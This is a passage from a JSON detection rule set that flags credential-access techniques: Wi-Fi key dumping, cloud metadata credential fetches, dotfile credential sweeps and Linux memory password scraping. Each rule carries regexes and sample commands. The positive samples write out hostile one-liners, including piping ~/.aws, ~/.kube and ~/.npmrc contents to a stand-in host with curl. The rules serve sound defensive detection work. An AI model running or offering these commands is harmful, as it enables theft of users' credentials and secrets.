  {
   "id": "byte-cred-wifi-dump",
   "name": "Wi-Fi password dump command",
   "description": "netsh wlan show profile with key=clear.",
   "tactic": "Credential Access",
   "technique": "T1555",
   "severity": "medium",
   "weight": 28,
   "applies_to": "both",
   "format": "any",
   "strings": [
    {
     "name": "a",
     "type": "regex",
     "value": "netsh\\s+wlan\\s+show\\s+profiles?\\b[^\\n]{0,80}key\\s*=\\s*clear",
     "nocase": true
    }
   ],
   "condition": {
    "str": "a"
   },
   "samples": {
    "positive": [
     {
      "text": "netsh wlan show profile name=\"x\" key=clear"
     }
    ],
    "negative": [
     {
      "text": "netsh wlan show profiles"
     },
     {
      "text": "key=clear"
     }
    ]
   }
  },
  {
   "id": "byte-cred-cloud-metadata-theft",
   "name": "Cloud instance metadata credential fetch",
   "description": "Requests to the link-local metadata service for IAM role credentials.",
   "tactic": "Credential Access",
   "technique": "T1552.005",
   "severity": "medium",
   "weight": 28,
   "applies_to": "both",
   "format": "script",
   "tags": [
    "noisy-risk"
   ],
   "strings": [
    {
     "name": "a",
     "type": "regex",
     "value": "169\\.254\\.169\\.254/latest/meta-data/iam/security-credentials"
    },
    {
     "name": "b",
     "type": "regex",
     "value": "\\b(?:curl|wget|requests\\.get|urlopen|Invoke-WebRequest)\\b",
     "nocase": true
    }
   ],
   "condition": {
    "all": [
     {
      "str": "a"
     },
     {
      "str": "b"
     }
    ]
   },
   "samples": {
    "positive": [
     {
      "text": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role"
     }
    ],
    "negative": [
     {
      "text": "http://169.254.169.254/latest/meta-data/iam/security-credentials"
     },
     {
      "text": "curl http://169.254.169.254/latest/meta-data/hostname"
     }
    ]
   }
  },
  {
   "id": "byte-cred-dotfile-sweep",
   "name": "Script sweeping several credential files",
   "description": "A script touching at least three of the well-known credential stores (.aws, .docker, .kube, .ssh, .npmrc, .git-credentials) and sending them off-host.",
   "tactic": "Credential Access",
   "technique": "T1552.001",
   "severity": "medium",
   "weight": 30,
   "applies_to": "both",
   "format": "script",
   "tags": [
    "noisy-risk"
   ],
   "strings": [
    {
     "name": "a",
     "type": "ascii",
     "value": ".aws/credentials"
    },
    {
     "name": "d",
     "type": "ascii",
     "value": ".docker/config.json"
    },
    {
     "name": "k",
     "type": "ascii",
     "value": ".kube/config"
    },
    {
     "name": "s",
     "type": "ascii",
     "value": ".ssh/id_"
    },
    {
     "name": "n",
     "type": "ascii",
     "value": ".npmrc"
    },
    {
     "name": "g",
     "type": "ascii",
     "value": ".git-credentials"
    },
    {
     "name": "u",
     "type": "regex",
     "value": "\\b(?:curl|wget|nc|scp|requests\\.post|Invoke-WebRequest)\\b",
     "nocase": true
    }
   ],
   "condition": {
    "all": [
     {
      "n_of": {
       "count": 3,
       "of": [
        "a",
        "d",
        "k",
        "s",
        "n",
        "g"
       ]
      }
     },
     {
      "str": "u"
     }
    ]
   },
   "samples": {
    "positive": [
     {
      "text": "cat ~/.aws/credentials ~/.kube/config ~/.npmrc | curl -d @- http://x"
     }
    ],
    "negative": [
     {
      "text": "cat ~/.aws/credentials ~/.kube/config ~/.npmrc"
     },
     {
      "text": "cat ~/.aws/credentials | curl -d @- http://x"
     }
    ]
   }
  },
  {
   "id": "byte-cred-mimipenguin-linux",
   "name": "Linux memory password scraping",
   "description": "Reading /proc/<pid>/maps and mem of gnome-keyring/sshd/ssh-agent-style processes to grep clear text.",
   "tactic": "Credential Access",
   "technique": "T1003.007",
   "severity": "high",
   "weight": 45,
   "applies_to": "both",
   "format": "script",
   "strings": [
    {
     "name": "a",
     "type": "regex",
     "value": "/proc/\\$?\\{?\\w+\\}?/(?:maps|mem)"
    },
    {
     "name": "p",
     "type": "regex",
     "value": "gnome-keyring|sshd|vsftpd|apache2|lightdm",
     "nocase": true
    },
    {
     "name": "g",
     "type": "regex",
     "value": "\\bstrings\\b|\\bgrep\\b|dd\\s+if=/proc",
     "nocase": true
    },
    {
     "name": "n",
     "type": "regex",
     "value": "password|passwd",
     "nocase": true
    }
   ],
   "condition": {
    "all": [
     {
      "str": "a"
     },
     {
      "str": "p"
     },
     {
      "str": "g"
     },
     {
      "str": "n"
     }
    ]
   },
   "samples": {
    "positive": [
     {
      "text": "dd if=/proc/$pid/mem ... # gnome-keyring password grep /proc/$pid/maps"
     }
    ],
    "negative": [
     {
      "text": "cat /proc/$pid/maps"
     },
     {
      "text": "gnome-keyring grep password"
     }
    ]
   }
  }
 ]
}
